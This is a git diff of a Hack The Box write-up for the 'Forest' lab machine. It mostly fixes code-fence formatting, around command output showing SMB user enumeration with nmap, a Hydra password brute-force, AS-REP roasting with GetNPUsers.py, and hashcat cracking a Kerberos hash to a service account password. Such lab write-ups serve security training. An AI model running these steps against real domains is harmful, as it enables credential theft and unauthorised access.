@@ -65,7 +65,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ![](2021-01-14-16-52-02.png)
 
-
+```
 kali@kali:~/htb/boxes/forest/10.10.10.161$ locate .nse | grep smb
 /usr/share/nmap/scripts/smb-brute.nse
 /usr/share/nmap/scripts/smb-check-vulns.nse
@@ -118,9 +118,6 @@ Host script results:
 |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
 
 nmap --script smb-enum* -p445,139 10.10.10.161
-
-
-
 | smb-enum-users: 
 |   HTB\$331000-VK4ADACQNUCA (RID: 1123)
 |     Flags:       Normal user account, Password Expired, Password not required, Account disabled
@@ -182,8 +179,7 @@ nmap --script smb-enum* -p445,139 10.10.10.161
 |   HTB\santi (RID: 1152)
 |     Full name:   Santi Rodriguez
 |_    Flags:       Normal user account, Password does not expir
-
-
+```
 
 non expired:
 
@@ -232,7 +228,7 @@ Santi Rodriguez
 Santi
 Rodriguez
 
-
+```
 cat /usr/share/seclists/Passwords/xato-net-10-million-passwords-10.txt >> passwords.txt
 
 kali@kali:~/htb/boxes/forest/10.10.10.161$ hydra -L users.txt -P passwords.txt smb2://10.10.10.161
@@ -245,7 +241,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-14 17:17:
 1 of 1 target completed, 0 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-14 17:18:19
 
-
+```
 
 ```
 enum4linux
@@ -362,12 +358,12 @@ santi
 GetNPUsers.py HTB.local/ -request -format hashcat -outputfile npusers.hash -dc-ip 10.10.10.161
 
 https://youtu.be/pZSyGRjHNO4
-
+```
 C:\tmp\hashcat-6.1.1>hashcat -m18200 forest.kerberos rockyou.txt --show
 
                      $krb5asrep$23$svc-alfresco@HTB.LOCAL:3166db4a36d1044f5f4f37cdd4aab0bc$2861146859fad9e8396eb56763c6054aef5bf09f834e63132aaf7f58b42ba253a1f4d5309583d1eea7870cb1b281da3367c12cc4029f6b8643a10d88a6e87dd720a7903b01598a2c290bb2e4d0c21923b50ff6d74527302a68f8c11607156d15de27ea9bae4bc0a2ced27c3fa6b595d079b2ce13954b7cea80bef15230464a4c0e56d1b74ea8314ba6469f481743d2f11ec7d9e550ad41f34b8a4be2b40ca8d7e18e130f58ea3e596c752196071a8db2ddc802075a00784e50dd39afb71d97f9a74ec50b552e9bda1b23626427c81710f2eaa902f4a7650ca95e5bb3c3c8bcdb7539c4d33e98:s3rvice 
 
-
+```
 svc-alfresco:s3rvice
 
 ![](2021-01-14-17-55-58.png)
